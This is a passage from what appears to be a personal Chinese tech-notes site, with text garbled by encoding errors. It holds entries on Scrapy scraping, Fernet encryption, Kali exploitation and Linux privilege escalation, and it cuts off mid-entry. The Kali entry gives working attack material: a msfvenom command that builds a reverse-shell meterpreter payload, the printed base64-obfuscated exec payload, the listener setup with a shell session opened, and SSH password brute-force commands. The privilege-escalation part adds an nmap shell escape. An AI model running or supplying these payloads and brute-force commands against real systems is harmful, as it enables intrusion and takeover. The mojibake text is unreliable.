è€å¸ˆä¿¡æ¯éƒ½åœ¨ä¸€ä¸ª div é‡Œé¢: ç»“æ„å¤§æ¦‚å¦‚ä¸‹: <div class=\"tea_con\"> <div class=\"tea_txt\"> ç¬¬ä¸€éƒ¨åˆ†è€å¸ˆä¿¡æ¯çš„ li åˆ—è¡¨ </div> <div class=\"tea_txt\"> ç¬¬äºŒéƒ¨åˆ†è€å¸ˆä¿¡æ¯çš„ li åˆ—è¡¨ </div> <div class=\"tea_txt\"> ç¬¬ä¸‰éƒ¨åˆ†è€å¸ˆä¿¡æ¯çš„ li åˆ—è¡¨ </div> ... </div> æˆ‘ä»¬ç°åœ¨ä½¿ç”¨ CSS é€‰æ‹©å™¨è·å–æœ€å¤–å±‚: >>> response.css(\"div.tea_con\") [<Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]\" data='<div class=\"tea_con\">\\n\\t\\t<div class=\"t...'>] >>> å®šä½ä¸‹ä¸€å±‚(è¾“å‡ºå¤ªå¤šå°±ä¸å…¨è´´): >>> response.css(\"div.tea_con div.tea_txt\") [<Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]... è¿™ä¸ªæ—¶å€™è·å–çš„ç»“æœåˆ—è¡¨æ˜¯æ‰€æœ‰çš„: <div class=\"tea_txt\">... <div class=\"tea_txt\">... <div class=\"tea_txt\">... ... ç»§ç»­, å¦‚ä½•è·å–æ¯ä¸€éƒ¨åˆ†çš„ä¿¡æ¯, å…ˆè§‚å¯Ÿhtml: <ul> <li> <img src='images/teacher/javaee/20210126133739æœè€å¸ˆ_è®²å¸ˆ.jpg'> <div class=\"li_txt\"> <h3>æœè€å¸ˆ</h3> <h4>é«˜çº§è®²å¸ˆ</h4> <p>15å¹´è½¯ä»¶å¼€å‘ä¸æ•™å­¦ç»éªŒï¼Œç†Ÿç»ƒæŒæ¡MySQLã€Redisã€SSMæ¡†æ¶ã€Dubboã€ZooKeeperã€SpringBootã€SpringCloudç­‰æŠ€æœ¯,ä¸»æŒä¸å‚ä¸è¿‡å¸‚çº§è´¢åŠ¡ç³»ç»Ÿï¼Œä¼ä¸šç®¡ç†ç­‰ç³»ç»Ÿå¼€å‘ã€‚ç†Ÿæ‚‰åˆ†å¸ƒå¼æŠ€æœ¯ï¼Œäº†è§£å¾®æœåŠ¡æ¶æ„ï¼Œå…·å¤‡å¤šä¸ªè¡Œä¸šé¡¹ç›®äº§å“å¼€å‘ä¸ç®¡ç†ç»éªŒï¼Œå¯¹åŸ¹è®­æœ‰æ·±åˆ»çš„ç†è§£å’ŒæŠŠæ¡ã€‚</p> </div> </li> <li> <img src='images/teacher/javaee/2020080614171120200701111719å§œæ¶›.jpg'> <div class=\"li_txt\"> <h3>å§œè€å¸ˆ</h3> <h4>é«˜çº§è®²å¸ˆ</h4> <p>æ“…é•¿Java EEä¼ä¸šçº§åº”ç”¨ï¼Œåä½™å¹´é¡¹ç›®ç®¡ç†ç»éªŒï¼Œæ›¾æ‹…ä»»å¼€å‘å·¥ç¨‹å¸ˆï¼Œæ¶æ„å¸ˆç­‰é‡è¦è§’è‰²ã€‚ä¸»å¯¼å¤šä¸ªå¤§å‹é¡¹ç›®çš„æ¶æ„è®¾è®¡ã€ç®¡ç†ç­‰å·¥ä½œã€‚åœ¨äº’è”ç½‘é¡¹ç›®é¢†åŸŸå…·å¤‡ä¸°å¯Œçš„ç»éªŒï¼Œç²¾é€šå¾®æœåŠ¡æ¶æ„ï¼Œæ“…é•¿è§£å†³é«˜å¹¶å‘ï¼Œäº¿çº§æ•°æ®é‡ç­‰æ¶æ„è®¾è®¡ï¼Œæ‹¥æœ‰å¹¿æ³›çš„æŠ€æœ¯é¢ä¸å®è·µç»éªŒã€‚</p> </div> </li> ... </ul> åˆ°è¿™é‡Œå…¶å®å°±ä¸ç”¨è€ƒè™‘å¤–éƒ¨çš„å¾ªç¯äº†, å¯ä»¥ç›´æ¥å®šä½åˆ°æ¯ä¸€ä¸ªliæ ‡ç­¾: response.css(\"div.tea_con div.tea_txt ul li\") å…ˆåªè€ƒè™‘ç¬¬ä¸€ä¸ª(å› ä¸ºliå†…éƒ¨ç»“æ„ä¸€è‡´, åé¢çš„è¿­ä»£å°±è¡Œ): >>> response.css(\"div.tea_con div.tea_txt ul li\")[0] <Selector query=\"descendant-or-self::div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_con ')]/descendant-or-self::*/div[@class and contains(concat(' ', normalize-space(@class), ' '), ' tea_txt ')]/descendant-or-self::*/ul/descendant-or-self::*/li\" data='<li>\\n\\t\\t\\t\\t\\t<img src=\"images/teacher/ja...'> >>> >>> t1 = response.css(\"div.tea_con div.tea_txt ul li\")[0] >>> è·å–è€å¸ˆç…§ç‰‡: >>> t1.css(\"img::attr(src)\").get() 'images/teacher/javaee/20210126133739æœè€å¸ˆ_è®²å¸ˆ.jpg' è·å–è€å¸ˆåå­—: >>> t1.css(\"h3::text\").get() 'æœè€å¸ˆ' çº§åˆ«: >>> t1.css(\"h4::text\").get() 'é«˜çº§è®²å¸ˆ' ä»‹ç»: >>> t1.css(\"p::text\").get() '15å¹´è½¯ä»¶å¼€å‘ä¸æ•™å­¦ç»éªŒï¼Œç†Ÿç»ƒæŒæ¡MySQLã€Redisã€SSMæ¡†æ¶ã€Dubboã€ZooKeeperã€SpringBootã€SpringCloudç­‰æŠ€æœ¯,ä¸»æŒä¸å‚ä¸è¿‡å¸‚çº§è´¢åŠ¡ç³»ç»Ÿï¼Œä¼ä¸šç®¡ç†ç­‰ç³»ç»Ÿå¼€å‘ã€‚ç†Ÿæ‚‰åˆ†å¸ƒå¼æŠ€æœ¯ï¼Œäº†è§£å¾®æœåŠ¡æ¶æ„ï¼Œå…·å¤‡å¤šä¸ªè¡Œä¸šé¡¹ç›®äº§å“å¼€å‘ä¸ç®¡ç†ç»éªŒï¼Œå¯¹åŸ¹è®­æœ‰æ·±åˆ»çš„ç†è§£å’ŒæŠŠæ¡ã€‚' >>> é‚£ä¹ˆå¯¹äºæ‰€æœ‰çš„è€å¸ˆ, å¯ä»¥ç®€å•çš„å¾ªç¯å¤„ç†: >>> data = [] >>> from collections import namedtuple >>> Teacher = namedtuple(\"Teacher\", [\"image\", \"name\", \"level\", \"desc\"]) >>> for t in response.css(\"div.tea_con div.tea_txt ul li\"): ... img = t.css(\"img::attr(src)\").get() ... name = t.css(\"h3::text\").get() ... level = t.css(\"h4::text\").get() ... desc = t.css(\"p::text\").get() ... data.append(Teacher(img, name, level, desc)) å°±è·å–åˆ°äº†æ‰€æœ‰æ•°æ®, å¯ä»¥ç®€å•çœ‹çœ‹ç»“æœ: >>> data[0] Teacher(image='images/teacher/javaee/20210126133739æœè€å¸ˆ_è®²å¸ˆ.jpg', name='æœè€å¸ˆ', level='é«˜çº§è®²å¸ˆ', desc='15å¹´è½¯ä»¶å¼€å‘ä¸æ•™å­¦ç»éªŒï¼Œç†Ÿç»ƒæŒæ¡MySQLã€Redisã€SSMæ¡†æ¶ã€Dubboã€ZooKeeperã€SpringBootã€SpringCloudç­‰æŠ€åŠ¡æ¶æ„ï¼Œå…·å¤‡å¤šä¸ªè¡Œä¸šé¡¹ç›®äº§å“å¼€å‘ä¸ç®¡ç†ç»éªŒï¼Œå¯¹åŸ¹è®­æœ‰æ·±åˆ»çš„ç†è§£å’ŒæŠŠæ¡ã€‚') >>> data[1] Teacher(image='images/teacher/javaee/2020080614171120200701111719å§œæ¶›.jpg', name='å§œè€å¸ˆ', level='é«˜çº§è®²å¸ˆ', desc='æ“…é•¿Java EEä¼ä¸šçº§åº”ç”¨ï¼Œåä½™å¹´é¡¹ç›®ç®¡ç†ç»éªŒï¼Œæ›¾æ‹…ä»»å¼€å‘å·¥ç¨‹å¸ˆï¼Œæ¶æ„å¸ˆç­‰é‡è¦è§’è‰²ã€‚ä¸»å¯¼å¤šä¸ªå¤§å‹é¡¹æ„è®¾è®¡ï¼Œæ‹¥æœ‰å¹¿æ³›çš„æŠ€æœ¯é¢ä¸å®è·µç»éªŒã€‚') >>> data.__len__() 179 æ‰€ä»¥ parse å¯ä»¥è¿™ä¹ˆå†™: def parse(self, response: Response): # filename = \"teacher.html\" # with open(filename, 'w') as f: # f.write(response.body.decode('utf-8')) from collections import namedtuple Teacher = namedtuple(\"Teacher\", [\"image\", \"name\", \"level\", \"desc\"]) data: [Teacher] = [] for t in response.css(\"div.tea_con div.tea_txt ul li\"): img = t.css(\"img::attr(src)\").get() name = t.css(\"h3::text\").get() level = t.css(\"h4::text\").get() desc = t.css(\"p::text\").get() data.append(Teacher(img, name, level, desc)) with open(\"teacher.json\", \"w\") as f: json.dump({\"data\": data}, f, ensure_ascii=False, indent=4) æ‰§è¡Œä¸‹çœ‹çœ‹ç»“æœ: cd mySpider; scrapy crawl itcast teacher.jsonå†…å®¹(éƒ¨åˆ†): è§£ææ•°æ®è½¬ç»™æ¡†æ¶ è¿˜æ˜¯æ”¹ parse: def parse(self, response: Response): for t in response.css(\"div.tea_con div.tea_txt ul li\"): img = t.css(\"img::attr(src)\").get() name = t.css(\"h3::text\").get() level = t.css(\"h4::text\").get() desc = t.css(\"p::text\").get() yield { \"head\": img, \"name\": name, \"level\": level, \"desc\": desc, } è¿™ä¸ªæ—¶å€™å†å¯åŠ¨å°±å¯ä»¥çœ‹åˆ°æ•°æ®æ‰“å°åœ¨æ—¥å¿—äº†, å¤ªå¤šæˆ‘å°±ä¸æ”¾äº†. å°†æ¡†æ¶è·å–åˆ°çš„æ•°æ®å¯¼å‡ºåˆ° t.json: scrapy crawl itcast -O t.json æ•ˆæœ: è¿˜å¯ä½¿ç”¨ -o t.jsonl ä»…æ–°å¢, è¯¦ç»†å‚è€ƒ crawl <CmdCrawl> å¦‚æœéœ€è¦æˆ–è®¸çš„æ•°æ®æ˜¯é“¾æ¥æ¯”å¦‚ href (å³åŠ¨æ€çš„): <ul class=\"pager\"> <li class=\"next\"> <a href=\"/page/2/\">Next <span aria-hidden=\"true\">&rarr;</span></a> </li> </ul> å¯ä»¥åœ¨parseåå¢åŠ åç»­çš„çˆ¬å–: def parse(...): ... next_page = response.css(\"li.next a::attr(href)\").get() if next_page is not None: next_page = response.urljoin(next_page) yield scrapy.Request(next_page, callback=self.parse) æ³¨è§£ urljoin æä¾›äº†è‡ªåŠ¨æ‹¼æ¥åˆ°ä¸Šä¸€å±‚, ä»è€Œè½¬æ¢ä¸ºç»å¯¹è·¯å¾„çš„åŠŸèƒ½ æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ response.follow ä½¿ç”¨ç›¸å¯¹è·¯å¾„: for href in response.css(\"ul.pager a::attr(href)\"): yield response.follow(href, callback=self.parse) å®é™…å¯¹äº a æ ‡ç­¾, æä¾›äº†è‡ªåŠ¨æ”¯æŒæ‰¾hrefçš„åŠŸèƒ½: for a in response.css(\"ul.pager a\"): yield response.follow(a, callback=self.parse) ç”šè‡³å¯ä»¥ç›´æ¥ä¸€æ¬¡æ€§å¤šåŒ¹é…: anchors = response.css(\"ul.pager a\") yield from response.follow_all(anchors, callback=self.parse) # ç®€å•ç‚¹å°±æ˜¯ yield from response.follow_all(css=\"ul.pager a\", callback=self.parse) XPathæ”¯æŒ XPath å‚è€ƒ /docs/åç«¯/python/æ•™ç¨‹/xpath/index é™¤äº† ä¸Šé¢çš„ä½¿ç”¨ CSSé€‰æ‹©å™¨æ¥åšæ•°æ®æå–, Scrapyçš„ é€‰æ‹©å™¨ ä¹Ÿæ”¯æŒ XPath å¯¹è±¡: >>> response.xpath(\"//title\") [<Selector query='//title' data='<title>å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜</title>'>] è¿”å›çš„ä¹Ÿæ˜¯ API/SelectorList å¯¹è±¡: >>> response.xpath(\"//title\").get() '<title>å¸ˆèµ„åŠ›é‡|è®²å¸ˆä»‹ç»_é»‘é©¬ç¨‹åºå‘˜</title>' æ³¨è§£ ä¸¾ä¾‹, å¦‚æœæœ‰ä¸€ä¸ª div: <div class=\"quote\"></div> å¦‚ä½•æ­£ç¡®çš„é€‰æ‹©æ­¤èŠ‚ç‚¹: response.css(\"div.quote\") ä¸¾ä¾‹, è¿˜æ˜¯ä¸Šé¢çš„è€å¸ˆä¿¡æ¯è·å–: >>> response.xpath(\"//div[@class='tea_con']\") [<Selector query=\"//div[@class='tea_con']\" data='<div class=\"tea_con\">\\n\\t\\t<div class=\"t...'>] åŒæ ·çš„, parse æ–‡ä»¶ å­˜å‚¨å†…å®¹ ï¼ˆpipelines.pyï¼‰ è®¾è®¡ç®¡é“å­˜å‚¨çˆ¬å–å†…å®¹ å¦‚æœåªæ˜¯ç®€å•çš„è·å–æŸäº›æ•°æ®, é‚£ä¹ˆä¸Šé¢çš„å†…å®¹å·²ç»è¶³å¤Ÿ. ä½†è‹¥æƒ³å¤„ç†æ›´å¤æ‚çš„äº‹æƒ…, é‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ° pipelines å‚è€ƒ: Scrapy Tutorial","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-use.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-use.html"},{"title":"cryptography","text":"é¡¹ç›®åœ°å€: https://github.com/pyca/cryptography/ å®˜ç½‘æ–‡æ¡£: https://cryptography.io/en/latest/ ç¿»è¯‘å°±æ˜¯ å¯†ç å­¦ å¯†ç å­¦å¯ç ”ç©¶ä¸‹101: CRYPTO101 ä¸€ä¸ªæ–°çš„æ ‡å‡†PythonåŠ å¯†åº“ ä¸ºä»€ä¹ˆå»ºç«‹ä¸€ä¸ªæ–°çš„Pythonå¯†ç åº“ï¼Ÿ ç°æœ‰çš„Pythonå¯†ç åº“ï¼Œå¦‚M2Crypto, PyCrypto, or PyOpenSSLï¼Œå­˜åœ¨ä¸€äº›é—®é¢˜ï¼š ç¼ºå°‘PyPyå’ŒPython 3æ”¯æŒ ç¼ºå°‘ç»´æŠ¤ ä½¿ç”¨äº†å·®è¯„çš„ç®—æ³•å®ç°ï¼ˆä¾‹å¦‚æ—è·¯æ”»å‡»side-channel attacksï¼‰ ç¼ºå°‘é«˜çº§ï¼ˆæ˜“äºä½¿ç”¨ï¼‰çš„APIs ç¼ºå°‘AES-GCMå’ŒHKDFç­‰ç®—æ³• ç»ä¸ä½æµ‹è¯• é”™è¯¯ç™¾å‡ºçš„APIs ç‰¹æ€§ Cyptographyå¯†ç åº“åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼šcryptographic recipes and primitives.è¿™æ˜¯æœ¬å¯†ç åº“éå¸¸æœ‰æ„æ€çš„åœ°æ–¹ï¼Œå¾ˆå¤šç°æœ‰çš„å…¶ä»–å¯†ç åº“å¹¶æ²¡æœ‰è¿™ä¸ªç‰¹ç‚¹ã€‚cryptographic recipesï¼Œç›´æ¥ç¿»è¯‘ä¸ºå¯†ç å­¦èœè°±ã€‚å…¶å®ä¸ªäººä¹Ÿä¸€æ—¶æ‰¾ä¸å‡ºåˆé€‚çš„è¯è¯­æ¥è§£é‡Šã€‚cryptographic primitivesï¼Œå³ä¸ºå¯†ç å­¦åŸè¯­ï¼Œä¹Ÿå°±æ˜¯åŸºæœ¬çš„å¯†ç æ¦‚å¿µï¼Œå¦‚åŠ å¯†ã€ç­¾åã€Hashç­‰ç®—æ³•ã€‚ä½†æ˜¯ç›´æ¥ä½¿ç”¨å¯†ç å­¦åŸè¯­å®¹æ˜“å‡ºé”™ï¼Œåœ¨å®é™…åº”ç”¨ä¸­æ— æ³•ä¿è¯å®‰å…¨æ€§ã€‚åŸºäºè¿™ä¸€ç‚¹ï¼Œè¯¥åº“å¯¹å¯†ç å­¦åŸè¯­è¿›è¡Œäº†å®‰å…¨é›†æˆï¼Œå½¢æˆäº†æ›´é«˜å±‚æ¬¡çš„\"å¯†ç å­¦èœè°±\"ã€‚è¿™ä¹ˆè¯´å§ï¼Œå¯†ç å­¦åŸè¯­åƒæ˜¯åšèœçš„åŸææ–™ï¼Œå¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œè™½ç„¶æ‰‹é‡Œéƒ½æœ‰ï¼Œä½†æ˜¯ä¸æ‡‚å¾—å¦‚ä½•å»åˆ¶ä½œï¼›å¦‚æœæœ‰äº†\"å¯†ç å­¦èœè°±\"ï¼Œåˆå­¦è€…ç›´æ¥æŒ‰ç…§è¯´æ˜ï¼Œåˆ¶ä½œèœè‚´å°±å¯ä»¥äº†ã€‚ å®‰è£…: pip install cryptography ç”¨ä¾‹ Cryptographyå¯†ç åº“å®ç°äº†ä¸€ä¸ªé›†æˆçš„å¯¹ç§°å¯†ç å‡½æ•°ï¼Œç§°ä¹‹ä¸ºFernetã€‚å®ƒå¯ä»¥ä¿è¯ä¿¡æ¯æ— æ³•è¢«ç¯¡æ”¹å’Œç ´è§£ã€‚ åŠ è§£å¯† åŠ è§£å¯†çš„ä¾‹å­: >>>from cryptography.fernet import Fernet >>>key = Fernet.generate_key() # äº§ç”ŸåŠ å¯†æ‰€éœ€çš„å¯†é’¥keyï¼Œå®ƒé€šè¿‡è°ƒç”¨ç›¸å…³å‡½æ•°è€Œäº§ç”Ÿéšæœºæ•°ã€‚ >>>key Out[3]: 'x10qxCPeNGhddcP5fASy5XB1JedmwXJeAF1gS-zeuvw=' >>>f = Fernet(key) # å®ä¾‹åŒ–Fernet >>>f Out[6]: <cryptography.fernet.Fernet at 0xb969668> >>>token = f.encrypt(b\"my deep dark secret\") # åŠ å¯†æ¶ˆæ¯ >>>token Out[8]: 'gAAAAABYnKtVmGpMe6rM39jzSYFTlBxjXBwbCix8nZ2DBzsFh6BVzwtrYx0qDyohXQ3xqj232_DJsdN8bR9sMUQbEcPenZD-MAWqR-YkOdg7prc9e0QnMA4=' >>>f.decrypt(token) # åŠ å¯†æ¶ˆæ¯ Out[9]: 'my deep dark secret' å¯†é’¥è½®æ¢ï¼ˆKey rotationï¼‰ å¯†é’¥è½®æ¢ï¼ˆKey rotationï¼‰çš„ä¾‹å­ MultiFernetçš„è¾“å…¥ä¸ºå¤šä¸ªkeyçš„åˆ—è¡¨ï¼Œå®ƒæ€»æ˜¯ä»¥ç¬¬ä¸€ä¸ªå¯†é’¥åŠ å¯†æ¶ˆæ¯ï¼Œè€Œåœ¨è§£å¯†æ—¶ï¼Œä¾æ¬¡ä½¿ç”¨æ¯ä¸ªå¯†é’¥ã€‚ Key rotationæœºåˆ¶ä½¿å¾—æ›¿ä»£æ—§çš„å¯†é’¥å˜å¾—å®¹æ˜“ã€‚ ä¸ªäººå¯ä»¥å°†æ–°çš„å¯†é’¥æ·»åŠ åœ¨keyåˆ—è¡¨çš„ç¬¬ä¸€ä¸ªï¼Œå¼€å§‹åŠ å¯†æ–°çš„æ¶ˆæ¯ï¼Œè€Œåœ¨è§£å¯†ä»¥å‰çš„å¯†æ–‡åï¼Œå¦‚æœæ—§çš„å¯†é’¥ä¸å†éœ€è¦åˆ™ä¸¢å¼ƒ: >>>from cryptography.fernet import Fernet, MultiFernet >>>key1 = Fernet(Fernet.generate_key()) >>>key2 = Fernet(Fernet.generate_key()) >>>f = MultiFernet([key1, key2]) >>>token = f.encrypt(b\"Secret message!\") >>>token Out[6]: 'gAAAAABYnKzqNxRAbwP6hMMGmB4eIBhiAR2oVG136Dpive8AhNBdtjwKKiOj_Zaxv8e1dHWp1_WpvktTCT5lRnm9ZnBIK4AoMw==' >>>f.decrypt(token) Out[7]: 'Secret message!' >>>key3 = Fernet(Fernet.generate_key()) >>>f = MultiFernet([key3, key1, key2]) >>>f.decrypt(token) Out[10]: 'Secret message!' å‚è€ƒ: https://zhuanlan.zhihu.com/p/25168804","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cryptography.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cryptography.html"},{"title":"Kaliæ¼æ´åˆ†æåˆ©ç”¨","text":"ç»è¿‡ /docs/å®‰å…¨/å­¦ä¹ è®°å½•/Kaliä¿¡æ¯æ”¶é›† æ”¶é›†åˆ°çš„èµ„äº§ è”ç³»äººã€è”ç³»æ–¹å¼ åŸŸåå’Œå­åŸŸå IPã€ç«¯å£ä¿¡æ¯ æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€æ¡†æ¶ã€æ•°æ®åº“ã€ç‰ˆæœ¬ä¿¡æ¯ ç½‘ç«™æ–‡ä»¶ï¼ˆç›®å½•æ‰«æï¼‰ æœç´¢å¼•æ“å’Œç½‘ç»œç©ºé—´æµ‹ç»˜æ”¶é›†åˆ°çš„ä¿¡æ¯ ... æ¼æ´æ•°æ®åº“ CVE (Common Vulnerabilities & ExposUres ï¼‰ (é€šç”¨æ¼æ´å…±äº«å¹³å°): https://cve.mitre.org/ https://www.cvedetails.com/ https://www.cnvd.org/cn/ https://nox.qianxin.com/vulnerability å›½å†…çš„: # å›½å®¶ https://www.cnvd.org.cn/ # å¥‡å®‰ä¿¡ https://ti.qianxin.com/ https://ti.qianxin.com/vulnerability/ ä¸€èˆ¬æ¼æ´ç¼–å·: CVE + å¹´ä»½ + ç¼–å· å¦‚: CVE-2004-1137 æ¼æ´åˆ©ç”¨å·¥å…·é›† POC: Proof Of Concept(è§‚å¿µéªŒè¯) EXP: Exploit åˆ©ç”¨(æ¼æ´åˆ©ç”¨) å¯ç”¨æ¼æ´åˆ©ç”¨ç½‘ç«™: https://www.exploit-db.com/ ç›¸å…³æŒ‡ä»¤: /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/msfconsole çš„ searchsploit pocsuite æ³¨è§£ å¦‚æœè‡ªå·±è¦åšä¸€ä¸ªæ¼æ´æœé›†çš„æ±‡æ€»ç½‘ç«™, å¯ä»¥githubæœç´¢: pocsuite æä¾›äº†ä¸€ä¸ªåŸºç¡€çš„æ¡†æ¶ æ¼æ´æ‰«æå·¥å…· å•†ä¸šæ¼æ´æ‰«æå·¥å…· Appscan Nessus OpenVAS ... å…è´¹çš„ goby (çº¢é˜Ÿæ˜¯æ”¶è´¹ç‰ˆ) Burp https://github.com/k8gege/Ladon å›½äº§çš„ æ³¨è§£ ä¸€èˆ¬ä¸å…è®¸ä½¿ç”¨æ¼æ´æ‰«æå·¥å…·æ‰«æçº¿ä¸ŠæœåŠ¡, å› ä¸ºä¼šå»ºç«‹å¤§é‡è¯·æ±‚, è¯´ä¸å®šå°±ç›´æ¥æŠŠä½ å°äº†(åŒipå¤§é‡è¯·æ±‚) ä¸€èˆ¬å°±å†…éƒ¨æœªä¸Šçº¿çš„ç”¨ä¸‹ msfåå¼¹è¿æ¥ msfä½¿ç”¨è§ /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/msfconsole å®ä¾‹ ç”Ÿæˆpayload, æŒ‡ä»¤è¯¦è§ /docs/å®‰å…¨/kali/msf/msfvenom , ç”Ÿæˆä¸€ä¸ªpythonç‰ˆæœ¬çš„payload: # msfvenom -p python/meterpreter/reverse_tcp LHOST=æ”»å‡»æœºIP LPORT=æ”»å‡»æœºç«¯å£ -f raw -o payload.py # LHOST=æ”»å‡»æœºIP ä¸€èˆ¬ä¸ºè‡ªå·±æœ¬æœºip(æœ¬æœºå°±æ˜¯æ”»å‡»æœº) # LPORT=æ”»å‡»æœºç«¯å£ éšä¾¿ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.186.133 LPORT=8889 -f raw -o payload.py æ”»å‡»æœºç”Ÿæˆpayload æ”»å‡»æœºç”Ÿæˆ: â”Œâ”€â”€(kaliã‰¿kali)-[~/test] â””â”€$ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.186.133 LPORT=8889 -f raw -o payload.py /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME ... â”Œâ”€â”€(kaliã‰¿kali)-[~/test] â””â”€$ â”Œâ”€â”€(kaliã‰¿kali)-[~/test] â””â”€$ cat payload.py exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTg2LjEzMycsODg4OSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0])) å°†payloadä¼ é€’åˆ°é¶æœº åˆ©ç”¨æ¼æ´å°†ç”Ÿæˆçš„ payload.py ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ æ”»å‡»æœºä½¿ç”¨msfç›‘å¬ æŒ‡ä»¤: # è¿›å…¥msfæ§åˆ¶å° msfconsole # ä½¿ç”¨ç›‘å¬æ¨¡å— use exploit/multi/handler # è®¾ç½®payloadç±»å‹ æ³¨æ„è·Ÿä¸Šé¢ç”Ÿæˆæ—¶ä½¿ç”¨çš„æ¨¡å—è¦ä¸€è‡´ set payload python/meterpreter/reverse_tcp set lhost æ”»å‡»æœºIP set lport æ”»å‡»æœºç«¯å£ exploit å®ä¾‹: msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp payload => python/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set lhost 192.168.186.133 lhost => 192.168.186.133 msf6 exploit(multi/handler) > set lport 8889 lport => 8889 msf6 exploit(multi/handler) > msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.186.133:8889 å½“é¶æœºè§¦å‘payloadæ—¶å€™: [*] Sending stage (40168 bytes) to 192.168.186.129 [*] Meterpreter session 1 opened (192.168.186.133:8889 -> 192.168.186.129:53686) at 2024-02-25 21:56:55 +0800 meterpreter > å³è·å–åˆ° 192.168.186.129 çš„åå¼¹shell æ‰§è¡Œä¸ª dir æŒ‡ä»¤: meterpreter > dir Listing: D:\\Project\\DevTools\\phpStudy_64\\phpstudy_pro\\WWW\\test ============================================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 503 fil 2024-02-25 21:53:44 +08 pl.py 00 meterpreter > Burp Suiteçˆ†ç ´webå¯†ç  bpæ‹¦æˆªæˆåŠŸåå°†å…¶è½¬å…¥ Intruder ç„¶åé€‰æ‹© Sniper (ç‹™å‡»æ‰‹) æ¨¡å¼å³å¯ è®¾ç½®å¥½ Payload åç‚¹å‡» Start attack å¼€å§‹æ”»å‡» æ•ˆæœ å¯ä»¥çœ‹å‡ºå½“å¯†ç æ­£ç¡®æ—¶å€™, å“åº”é•¿åº¦å¯ä»¥ä½œä¸ºåˆ¤æ–­æ˜¯å¦æˆåŠŸæ ‡å¿—(è¿˜æ˜¯å¾—çœ‹æƒ…å†µ) Hydraçˆ†ç ´Linuxå¯†ç  ç›¸å…³æŒ‡ä»¤: /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/hydra /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/medusa /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/msfconsole ä¸‰ç§å·¥å…·: hydra -L username.txt -P password.txt 192.168.142.66 ssh medusa -M ssh -h 192.168.142.66 -u root -P password.txt msfconsole use auxiliary/scanner/ssh/ssh_login set RHOSTS 192.168.142.66 set PASS_FILE password.txt set USER_FILE username.txt exploit sqlmapæ¸—é€ å·¥å…· /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/sqlmap","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Study-record-Kali-vulnerability-analysis-and-utilization.html","loc":"/yq-doc-source-docs-Safety-Study-record-Kali-vulnerability-analysis-and-utilization.html"},{"title":"ææƒæ€»ç»“","text":"sudo/suidææƒ suidæ¶‰åŠåˆ°linuxçš„sæƒé™ä½: /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxä¸‹æ–‡ä»¶æƒé™ä½ sudoå¯ä»¥å…¶ä»–ç”¨æˆ·æ‰§è¡Œ, å¯è§: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/sudo ä¸€èˆ¬æ¥è¯´, å°±æ˜¯åˆ©ç”¨æŸäº›å…·æœ‰sä½æƒé™çš„æŒ‡ä»¤, è·å–åˆ°rootçš„æƒé™ æŸ¥æ‰¾å…·æœ‰suidæƒé™æ–‡ä»¶: find / -perm -u=s 2>/dev/null æŸ¥çœ‹å“ªäº›å‘½ä»¤èƒ½è¢«sudo: sudo -l æ¥ä¸‹æ¥åˆ—å‡ºå…·ä½“å¯ç”¨äºææƒçš„ä¸€äº›æŒ‡ä»¤ nmap nmap: echo \"os.execute('/bin/bash')\" > ./shell nmap --script=shell suid-find findå‘½ä»¤è‡ªå¸¦-execå‚æ•°, 